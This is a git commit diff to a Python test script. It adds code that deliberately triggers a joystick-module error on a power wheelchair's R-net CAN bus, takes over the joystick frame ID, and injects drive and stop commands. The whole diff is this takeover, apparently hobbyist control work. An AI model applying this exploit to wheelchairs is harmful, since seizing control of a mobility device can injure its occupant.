d31a9208a6e24564d726f233845c2ea88944f75e
Alexandr5656 <alexburbano5656@gmail.com>
2023-10-02 17:25:33 -0400

    tes

--- startingTest.py
+++ startingTest.py
@@ -1,25 +1,63 @@
 
 import sys
-from can2RNET import cansend
-from time import sleep
+from can2RNET import cansend, canwait
+from time import sleep, time
 import socket
 
+# Function to induce JSM error
+def induce_JSM_error(cansocket):
+    for i in range(0,3):
+        cansend(cansocket,'0c000000#')
+
+# Function to exploit JSM error
+def RNET_JSMerror_exploit(cansocket):
+    print("Waiting for JSM heartbeat")
+    canwait(cansocket,"03C30F0F:1FFFFFFF")
+    t = time() + 0.20
+
+    print("Waiting for joy frame")
+    joy_id = wait_rnet_joystick_frame(cansocket, t)
+    print("Using joy frame: " + joy_id)
+
+    induce_JSM_error(cansocket)
+    print("3 x 0c000000# sent")
+
+    return joy_id
+
+# Function to wait for any frame containing a Joystick position
+def wait_rnet_joystick_frame(can_socket, start_time):
+    frameid = ''
+
+    while frameid[0:3] != '020':
+        cf, addr = can_socket.recvfrom(16)
+        candump_frame = dissect_frame(cf)
+        frameid = candump_frame.split('#')[0]
+        if time() > start_time:
+            print("JoyFrame wait timed out")
+            return 'Err!'
+    return frameid
+
+# Function to drive the wheelchair forward for a specified amount of time
 def drive_forward(seconds):
     # Initialize CAN socket
-    print("Starting")
     s = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
     s.bind(("can0",))
 
-    # CAN frame to move the wheelchair forward (using arbitrary values, these will need to be determined experimentally)
-    forward_frame = '020#000080'  # This frame is a placeholder and likely incorrect
+    # Exploit JSM error to gain control (if necessary)
+    joy_id = RNET_JSMerror_exploit(s)
+
+    # CAN frame to move the wheelchair forward (following the structure in JoyLocal.py)
+    forward_frame = joy_id + '#000080'  # This frame may need adjustment
+
     # Send the forward command
     cansend(s, forward_frame)
 
     # Wait for the specified amount of time
     sleep(seconds)
 
-    # CAN frame to stop the wheelchair (using arbitrary values, these will need to be determined experimentally)
-    stop_frame = '020#000000'  # This frame is a placeholder and likely incorrect
+    # CAN frame to stop the wheelchair
+    stop_frame = joy_id + '#000000'  # This frame may need adjustment
+
     # Send the stop command
     cansend(s, stop_frame)
 
